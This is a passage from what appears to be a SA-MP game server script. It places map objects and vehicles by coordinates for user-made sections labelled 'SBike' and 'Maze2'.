	CreateSObject(1225, 1981.7084960938, 554.42303466797, 1.6010582447052, 0, 0, 0);
	CreateSObject(3374, 2006.4104003906, 533.2294921875, 1.2999993562698, 0, 0, 348.08532714844);
	CreateSObject(3374, 2030.2966308594, 517.6806640625, 1.3749992847443, 0, 0, 348.08532714844);
	CreateSObject(3374, 2059.7041015625, 515.08905029297, 1.3249955177307, 0, 0, 348.08532714844);
	CreateSObject(3374, 2084.5625, 500.90631103516, 1.1749994754791, 0, 0, 348.08532714844);
	CreateSObject(3374, 2043.3416748047, 497.3132019043, 1.3499993085861, 0, 0, 348.08532714844);
	CreateSObject(3374, 2099.1411132813, 481.56304931641, 1.324999332428, 0, 0, 348.08532714844);
	CreateSObject(3374, 2109.0400390625, 457.36599731445, 1.3499993085861, 0, 0, 348.08532714844);
	CreateSObject(3374, 2116.0129394531, 495.5969543457, 1.324999332428, 0, 0, 348.08532714844);
	CreateSObject(1225, 2099.1447753906, 481.67202758789, 1.836773276329, 0, 0, 0);
	CreateSObject(1225, 2006.4515380859, 533.17132568359, 1.9867731332779, 0, 0, 0);
	CreateSObject(3374, 2071.5075683594, 537.93859863281, 1.3999992609024, 0, 0, 348.08532714844);
	CreateSObject(1225, 2071.4201660156, 537.89721679688, 1.2867809534073, 0, 0, 0);
	CreateSObject(3374, 2081.138671875, 438.43368530273, 1.2999993562698, 0, 0, 348.08532714844);
	CreateSObject(3374, 2119.5881347656, 527.59283447266, 0, 0, 0, 348.08532714844);
	CreateSObject(8372, 1972.4976806641, 499.53240966797, 0, 0, 0, 0);
	CreateSObject(7072, 2181.7866210938, 433.68859863281, 35.981254577637, 0, 0, 0);
	CreateSObject(7072, 2183.2788085938, 434.01019287109, 36.01301574707, 0, 0, 0);
	CreateSObject(3877, 2189.9765625, 489.177734375, -2.1178998947144, 0, 0, 0);
	CreateSObject(3877, 2190.05859375, 490.173828125, -2.0749988555908, 0, 0, 0);
	CreateSObject(3877, 2190.03125, 491.306640625, -2.0999989509583, 0, 0, 0);
	CreateSObject(3877, 2190.1552734375, 492.244140625, -2.0749988555908, 0, 0, 0);
	CreateSObject(3877, 2190.3037109375, 493.2421875, -2.1108393669128, 0, 0, 0);
	CreateSObject(3877, 2190.228515625, 494.2744140625, -2.1350002288818, 0, 0, 0);
	CreateSObject(3877, 2190.271484375, 495.2333984375, -2.0749988555908, 0, 0, 0);
	CreateSObject(3877, 2190.431640625, 496.19482421875, -1.9949461221695, 0, 0, 0);
	CreateSObject(3877, 2190.4365234375, 496.943359375, -1.9999996423721, 0, 0, 0);
	CreateSObject(1225, 1979.8681640625, 507.59915161133, 1.3631815910339, 0, 0, 0);
	CreateVehicleEx(460,2458.7864,421.5292,1.7680,252.9402,1,9); // skimer
	CreateVehicleEx(447,2412.4658,532.5087,0.8764,293.2544,75,2); // seasparrow
	// SBike (StreeTBoy+Zryex):
	CreateSObject(8171, -2598.433838, 1520.982788, 1.422325, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(8171, -2529.620361, 1625.293335, 2.164345, 0.8594, 0.0000, 314.2952, 500);
	CreateSObject(8171, -2432.050537, 1654.738403, 2.894726, 0.0000, 0.8594, 258.7500, 500);
	CreateSObject(1676, -2579.825439, 1515.423462, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2583.892822, 1517.132080, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2587.992432, 1518.724243, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2592.197510, 1520.394165, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2595.823975, 1521.865601, 3.003193, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2599.427002, 1523.346191, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2603.190674, 1524.856567, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2606.571777, 1526.135010, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2609.898193, 1527.670288, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1676, -2613.218262, 1528.934570, 3.003192, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(3374, -2453.770264, 1677.084961, 4.605372, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.770020, 1677.176636, 7.605372, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.762207, 1677.181763, 10.605372, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.745361, 1677.232056, 13.605372, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.743652, 1677.230713, 16.605373, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.802002, 1677.218872, 19.561651, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.887695, 1677.210449, 22.561651, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.842041, 1677.185059, 25.358898, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2453.786865, 1677.188110, 28.358898, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2449.885498, 1676.302856, 28.384527, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2446.159180, 1675.642334, 27.072147, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2442.351563, 1674.931763, 25.772642, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2438.864746, 1674.329834, 22.864594, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2449.931641, 1676.335449, 4.915917, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2435.645508, 1673.842896, 19.977921, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2446.091064, 1675.638306, 5.916227, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2442.196289, 1674.870117, 7.335857, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2439.201416, 1674.463745, 10.231103, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2435.858398, 1673.768433, 13.231103, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2435.030029, 1673.745728, 16.208241, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2435.007324, 1673.731567, 17.108238, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2423.001953, 1671.051025, 4.895635, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.972656, 1671.039185, 7.895635, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.969482, 1671.083130, 10.895635, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.944092, 1671.107178, 13.895635, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.914307, 1671.418213, 16.810223, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.848145, 1671.439087, 19.810223, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.848145, 1671.391357, 22.810223, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.825928, 1671.578613, 25.810223, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2419.833008, 1671.205566, 28.810223, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2413.537598, 1669.792480, 22.909182, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2416.156494, 1670.394775, 25.817213, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2411.719482, 1669.504883, 19.896919, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2409.746094, 1669.036865, 16.949839, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2408.043945, 1668.602173, 13.999935, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2404.486084, 1667.812988, 11.176417, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2400.751465, 1667.159668, 14.107218, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2398.911865, 1666.832520, 16.995472, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2396.956299, 1666.433716, 19.995472, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2394.985596, 1666.064087, 22.995472, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2393.066650, 1665.728882, 25.995472, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2390.271729, 1665.064087, 28.995472, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.199463, 1664.442993, 26.009138, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.191406, 1664.392212, 23.076157, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.236328, 1664.376465, 20.280388, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.269043, 1664.367920, 17.379049, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.316650, 1664.407471, 14.366982, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.320068, 1664.464722, 11.401979, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.332031, 1664.562988, 8.403800, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.352783, 1664.567383, 5.451848, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2422.724121, 1671.758545, 28.810223, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2387.199219, 1664.516602, 29.009138, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(1503, -2606.086182, 1502.394531, 1.816441, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2596.805908, 1521.910522, 1.422325, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(2780, -2611.845947, 1528.125366, 1.422324, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(2780, -2584.396484, 1518.187012, 1.422323, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(3374, -2572.642334, 1540.961426, 2.916302, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(3374, -2580.459961, 1550.960205, 2.916302, 0.0000, 0.0000, 315.0000, 500);
	CreateSObject(3374, -2588.237793, 1555.700684, 2.916302, 0.0000, 0.0000, 315.0000, 500);
	CreateSObject(3374, -2596.404785, 1562.321045, 2.916302, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2570.372314, 1561.946411, 2.916302, 0.0000, 0.0000, 315.0000, 500);
	CreateSObject(3374, -2581.291992, 1573.742798, 2.916302, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(3374, -2590.010254, 1579.245117, 2.916302, 0.0000, 0.0000, 11.2500, 500);
	CreateSObject(3374, -2579.026855, 1565.711548, 2.916302, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(3374, -2587.853760, 1546.849976, 2.916302, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(3374, -2599.066406, 1552.581299, 2.916302, 0.0000, 0.0000, 11.2500, 500);
	CreateSObject(3374, -2567.378418, 1572.140137, 2.927599, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2576.910400, 1582.774048, 2.939867, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2568.058350, 1585.426636, 3.061721, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2582.820068, 1590.561035, 2.960171, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2557.013428, 1580.083252, 3.121732, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2574.319580, 1576.506836, 2.916302, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2587.355713, 1565.830200, 2.916302, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(3374, -2580.746582, 1560.367310, 2.916302, 0.0000, 0.0000, 326.2500, 500);
	CreateSObject(1225, -2580.447510, 1550.852783, 3.428080, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2572.732666, 1541.070190, 3.603076, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2587.947266, 1546.926392, 3.403075, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2588.291016, 1555.631958, 3.653083, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2581.137207, 1560.241943, 3.328080, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2581.244141, 1573.851807, 2.828080, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2582.625000, 1590.396851, 2.871950, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2567.584229, 1572.165039, 3.089378, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2557.119873, 1579.664917, 3.533511, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2570.354004, 1561.936646, 3.078080, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(2780, -2504.638672, 1629.000977, 2.718056, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2508.199707, 1633.632446, 2.713689, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2511.394531, 1637.416992, 2.720147, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2513.938232, 1638.903442, 2.709045, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2517.948730, 1643.071899, 2.710955, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2521.091064, 1644.913330, 2.697298, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2524.268799, 1648.424561, 2.701027, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2528.062256, 1649.836914, 2.675921, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(2780, -2530.083252, 1651.078979, 2.667751, 0.0000, 0.0000, 337.5000, 500);
	CreateSObject(1225, -2515.195801, 1617.900757, 2.894066, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2520.361572, 1621.390625, 2.876539, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2524.447998, 1626.213257, 2.868649, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2528.427246, 1625.721436, 2.786280, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2522.013184, 1623.676880, 2.856137, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2531.032715, 1634.234009, 2.884300, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2534.305908, 1633.431030, 2.841133, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2539.157715, 1638.923584, 2.864179, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2535.310547, 1627.776611, 2.770364, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2530.176025, 1628.696777, 2.834468, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2528.239258, 1634.314087, 2.914702, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2535.707275, 1641.597778, 2.913168, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2539.096191, 1634.553223, 2.802390, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2534.940186, 1625.016724, 2.744930, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2530.057861, 1623.096069, 2.776148, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2526.211914, 1622.119751, 2.806450, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2524.111328, 1621.100098, 2.817827, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2520.615723, 1619.582886, 2.838669, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2518.489258, 1616.990723, 2.833592, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2516.280762, 1622.777832, 2.918510, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2521.072998, 1627.528442, 2.918339, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2527.073975, 1632.244263, 2.905016, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2527.260986, 1627.803833, 2.855806, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2533.006592, 1628.579224, 2.803273, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2539.645996, 1632.651978, 2.776355, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2544.298828, 1634.805054, 2.750033, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2539.310791, 1629.151245, 2.742666, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(13641, -2432.834717, 1654.141968, 4.864303, 0.0000, 0.0000, 348.7500, 500);
	CreateSObject(8171, -2337.413330, 1686.070435, 3.277922, 0.8594, 1.7189, 348.9908, 500);
	CreateSObject(979, -2330.270264, 1618.780518, 2.551659, 0.0000, 0.0000, 258.7500, 500);
	CreateSObject(979, -2327.861084, 1631.857544, 2.665287, 0.0000, 0.0000, 258.7500, 500);
	CreateSObject(1225, -2405.677246, 1651.812622, 3.487551, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2406.205322, 1649.494995, 3.401905, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2406.971436, 1648.138672, 3.429706, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2404.140869, 1648.140747, 3.413021, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2402.604248, 1651.636353, 3.493949, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2400.581543, 1650.260864, 3.404630, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2400.968018, 1648.457520, 3.401968, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2402.346191, 1647.471802, 3.358429, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2404.197754, 1645.201050, 3.369604, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2406.187500, 1646.038696, 3.379183, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2401.628418, 1645.132324, 3.401112, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2398.027344, 1649.660400, 3.428271, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2397.587158, 1646.937744, 3.414502, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2398.324951, 1645.124146, 3.410657, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2400.613525, 1643.541382, 3.330673, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2404.097168, 1642.398804, 3.253670, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(1225, -2406.723389, 1644.066528, 3.345500, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(6052, -2328.039551, 1688.481079, 5.100572, 0.0000, 0.0000, 191.2499, 500);
	CreateSObject(6052, -2347.209473, 1690.103760, 5.618595, 0.0000, 0.0000, 270.0000, 500);
	CreateSObject(8171, -2414.570557, 1749.371338, 6.665533, 358.2811, 0.8594, 260.4689, 500);
	CreateSObject(8171, -2540.304688, 1762.983643, 34.459167, 337.6546, 0.8594, 267.3444, 500);
	CreateSObject(8171, -2585.190430, 1765.027466, 52.916794, 337.6546, 0.8594, 267.3444, 500);
	CreateSObject(8171, -2763.565186, 1773.885132, 29.181641, 30.0803, 0.0000, 269.9227, 500);
	CreateSObject(8171, -2844.012939, 1773.866821, 3.803792, 0.0000, 0.0000, 270.0000, 500);
	CreateSObject(1655, -2906.985352, 1774.500122, 5.103904, 0.0000, 0.0000, 90.0000, 500);
	CreateSObject(1655, -2913.826416, 1774.474976, 8.772032, 11.1727, 0.0000, 90.0000, 500);
	CreateSObject(1676, -2348.880127, 1717.235229, 5.801268, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2345.380127, 1716.661987, 5.701578, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2342.330078, 1716.128418, 5.605808, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2339.360107, 1715.667603, 5.499648, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2336.586670, 1715.249634, 5.402874, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2333.593262, 1714.695068, 5.321643, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2330.824219, 1714.274536, 5.227261, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2328.101563, 1713.682983, 5.167734, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2325.205322, 1713.188599, 5.074107, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2322.281250, 1712.655029, 4.962576, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2319.381104, 1712.112305, 4.852043, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2316.503174, 1711.628174, 4.790656, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(1676, -2313.684082, 1711.000977, 4.739694, 0.0000, 0.0000, 168.7500, 500);
	CreateSObject(982, -2349.902344, 1658.709351, 3.753945, 358.2811, 0.0000, 258.7500, 500);
	CreateSObject(982, -2335.925049, 1655.960083, 3.364493, 358.2811, 0.0000, 258.7500, 500);
	CreateSObject(1245, -2336.533691, 1685.846802, 4.615306, 0.0000, 0.0000, 258.7500, 500);
	CreateSObject(4141, -3027.359375, 1771.837036, 10.891758, 0.0000, 0.0000, 180.0000, 500);
	CreateSObject(1655, -2919.486328, 1774.504272, 13.401253, 22.3454, 0.0000, 90.0000, 500);
	CreateVehicleEx(522,-2639.8259,1433.5468,6.6628,322.3431,-1,-1); //
	CreateVehicleEx(522,-2638.2031,1432.1674,6.6672,330.0175,-1,-1); //
	CreateVehicleEx(522,-2641.5769,1434.9139,6.6629,320.2812,-1,-1); //
	CreateVehicleEx(522,-2644.0593,1437.0082,6.6641,318.4510,-1,-1); //
	CreateVehicleEx(522,-2646.5659,1439.2455,6.6618,316.4057,-1,-1); //
	CreateVehicleEx(510,-2635.2993,1429.6266,6.7030,317.2515,-1,-1); //
	CreateVehicleEx(510,-2636.3616,1430.5746,6.7024,323.2181,-1,-1); //
	CreateVehicleEx(411,-2623.5339,1428.5277,6.8208,339.4258,-1,-1); //
	CreateVehicleEx(462,-2633.8250,1428.6404,6.6976,318.2218,-1,-1); //
	CreateVehicleEx(463,-2632.2075,1427.4125,6.6380,319.5688,-1,-1); //
	// Maze2 (StreeTBoy+Zryex):
	CreateSObject(972, -4705.1079101563, 1633.1166992188, 79.429992675781, 0, 0, 0, 500);
	CreateSObject(972, -4691.046875, 1637.0408935547, 79.52075958252, 0, 0, 180.74072265625, 500);
	CreateSObject(972, -4697.9267578125, 1619.3731689453, 79.94898223877, 0, 0, 87.471435546875, 500);
	CreateSObject(972, -4715.5908203125, 1633.2016601563, 79.939476013184, 0, 0, 0, 500);
	CreateSObject(972, -4702.2421875, 1661.1428222656, 79.435432434082, 0, 0, 0, 500);
	CreateSObject(972, -4691.3681640625, 1661.73046875, 79.528099060059, 0, 0, 180.73059082031, 500);
	CreateSObject(972, -4715.6665039063, 1657.8657226563, 79.90885925293, 0, 0, 0, 500);
	CreateSObject(972, -4710.3037109375, 1682.9818115234, 79.865875244141, 0, 0, 330.22521972656, 500);
	CreateSObject(972, -4702.7236328125, 1679.2730712891, 79.92310333252, 0, 0, 3.186279296875, 500);
	CreateSObject(972, -4687.8608398438, 1685.0528564453, 79.570365905762, 0, 0, 164.85620117188, 500);
	CreateSObject(972, -4681.4150390625, 1709.0830078125, 79.652206420898, 0, 0, 164.84985351563, 500);
	CreateSObject(972, -4710.4106445313, 1704.7078857422, 79.665245056152, 0, 0, 236.31475830078, 500);
	CreateSObject(972, -4691.9331054688, 1710.6434326172, 79.821060180664, 0, 0, 164.84985351563, 500);
	CreateSObject(972, -4667.5478515625, 1723.4716796875, 79.660850524902, 0, 0, 117.21310424805, 500);
	CreateSObject(972, -4708.6284179688, 1700.4738769531, 79.844734191895, 0, 0, 55.678466796875, 500);
	CreateSObject(972, -4712.5908203125, 1665.4620361328, 79.926216125488, 0, 0, 27.789794921875, 500);
	CreateSObject(972, -4715.349609375, 1643.9024658203, 81.72819519043, 0, 0, 328.23303222656, 500);
	CreateSObject(972, -4711.095703125, 1647.6650390625, 75.836029052734, 0, 0, 230.96557617188, 500);
	CreateSObject(972, -4697.8364257813, 1735.6285400391, 79.732238769531, 0, 0, 210.50903320313, 500);
	CreateSObject(972, -4693.4501953125, 1736.9287109375, 79.525535583496, 0, 0, 210.50354003906, 500);
	CreateSObject(972, -4711.1162109375, 1754.4609375, 79.53148651123, 0, 0, 220.42419433594, 500);
	CreateSObject(972, -4724.625, 1724.8525390625, 79.778533935547, 0, 0, 220.42419433594, 500);
	CreateSObject(972, -4745.9443359375, 1738.8776855469, 79.747932434082, 0, 0, 250.19714355469, 500);
	CreateSObject(972, -4726.9560546875, 1773.0303955078, 79.541648864746, 0, 0, 220.4296875, 500);
	CreateSObject(972, -4747.642578125, 1733.869140625, 77.668304443359, 0, 0, 223.17626953125, 500);
	CreateSObject(972, -4731.1459960938, 1718.0349121094, 79.630958557129, 0, 0, 238.01440429688, 500);
	CreateSObject(972, -4745.107421875, 1732.4388427734, 81.025260925293, 0, 0, 217.42626953125, 500);
	CreateSObject(972, -4705.8642578125, 1757.8125, 79.45051574707, 0, 0, 210.50354003906, 500);
	CreateSObject(972, -4726.5205078125, 1719.4475097656, 79.262069702148, 0, 0, 216.17797851563, 500);
	CreateSObject(972, -4736.6708984375, 1731.2525634766, 82.506019592285, 0, 0, 194.34313964844, 500);
	CreateSObject(972, -4742.755859375, 1755.0723876953, 79.505836486816, 0, 0, 194.34265136719, 500);
	CreateSObject(972, -4749.0400390625, 1778.9217529297, 79.484771728516, 0, 0, 194.34265136719, 500);
	CreateSObject(972, -4714.3930664063, 1780.6676025391, 79.367691040039, 0, 0, 194.34265136719, 500);
	CreateSObject(972, -4719.1372070313, 1780.7954101563, 79.795783996582, 0, 0, 194.60278320313, 500);
	CreateSObject(972, -4737.0981445313, 1793.5184326172, 79.604972839355, 0, 0, 196.60583496094, 500);
	CreateSObject(972, -4719.8193359375, 1779.7698974609, 82.853645324707, 0, 0, 171.78601074219, 500);
	CreateSObject(972, -4711.7827148438, 1802.0859375, 79.445854187012, 0, 0, 159.0078125, 500);
	CreateSObject(972, -4718.8559570313, 1800.19140625, 79.752113342285, 0, 0, 163.25134277344, 500);
	CreateSObject(972, -4735.7827148438, 1815.3013916016, 79.598411560059, 0, 0, 163.25134277344, 500);
	CreateSObject(972, -4725.41796875, 1836.5108642578, 79.588409423828, 0, 0, 147.37139892578, 500);
	CreateSObject(972, -4754.953125, 1802.5386962891, 79.517692565918, 0, 0, 194.34265136719, 500);
	CreateSObject(972, -4752.2861328125, 1804.7391357422, 79.54727935791, 0, 0, 81.1982421875, 500);
	CreateSObject(972, -4645.466796875, 1734.8942871094, 79.602714538574, 0, 0, 117.21310424805, 500);
	CreateSObject(972, -4675.1533203125, 1727.2944335938, 79.504989624023, 0, 0, 117.20764160156, 500);
	CreateSObject(972, -4700.7280273438, 1822.9265136719, 79.449127197266, 0, 0, 147.37060546875, 500);
	CreateSObject(972, -4692.0512695313, 1839.1184082031, 79.474342346191, 0, 0, 158.49584960938, 500);
	CreateSObject(972, -4708.9326171875, 1822.2165527344, 79.788146972656, 0, 0, 162.49584960938, 500);
	CreateSObject(972, -4725.849609375, 1791.0124511719, 82.878707885742, 0, 0, 121.56634521484, 500);
	CreateSObject(972, -4655.3525390625, 1742.69140625, 79.40779876709, 0, 0, 139.03747558594, 500);
	CreateSObject(972, -4625.5810546875, 1745.03125, 79.618553161621, 0, 0, 117.21310424805, 500);
	CreateSObject(972, -4644.0268554688, 1765.0908203125, 79.39404296875, 0, 0, 234.76770019531, 500);
	CreateSObject(972, -4641.8359375, 1786.453125, 79.374732971191, 0, 0, 166.83288574219, 500);
	CreateSObject(972, -4650.697265625, 1809.5246582031, 79.36360168457, 0, 0, 226.01831054688, 500);
	CreateSObject(972, -4668.4204101563, 1826.6430664063, 79.400329589844, 0, 0, 226.01623535156, 500);
	CreateSObject(972, -4698.9560546875, 1842.7604980469, 79.794471740723, 0, 0, 150.58410644531, 500);
	CreateSObject(972, -4731.119140625, 1806.5988769531, 79.632736206055, 0, 0, 150.58410644531, 500);
	CreateSObject(972, -4722.03515625, 1816.9619140625, 79.603118896484, 0, 0, 126.54418945313, 500);
	CreateSObject(972, -4710.9609375, 1842.568359375, 79.479537963867, 0, 0, 85.079681396484, 500);
	CreateSObject(972, -4685.5732421875, 1842.6090087891, 79.354484558105, 0, 0, 196.783203125, 500);
	CreateSObject(972, -4673.716796875, 1842.4256591797, 79.167274475098, 0, 0, 138.66943359375, 500);
	CreateSObject(972, -4672.3041992188, 1851.9392089844, 79.257858276367, 0, 0, 145.10745239258, 500);
	CreateSObject(972, -4687.8891601563, 1851.9342041016, 79.231620788574, 0, 0, 8.12841796875, 500);
	CreateSObject(972, -4700.8671875, 1853.1440429688, 79.301658630371, 0, 0, 329.6923828125, 500);
	CreateSObject(972, -4620.9130859375, 1754.0361328125, 79.73176574707, 0, 0, 101.01379394531, 500);
	CreateSObject(972, -4596.384765625, 1758.8344726563, 79.725303649902, 0, 0, 101.00830078125, 500);
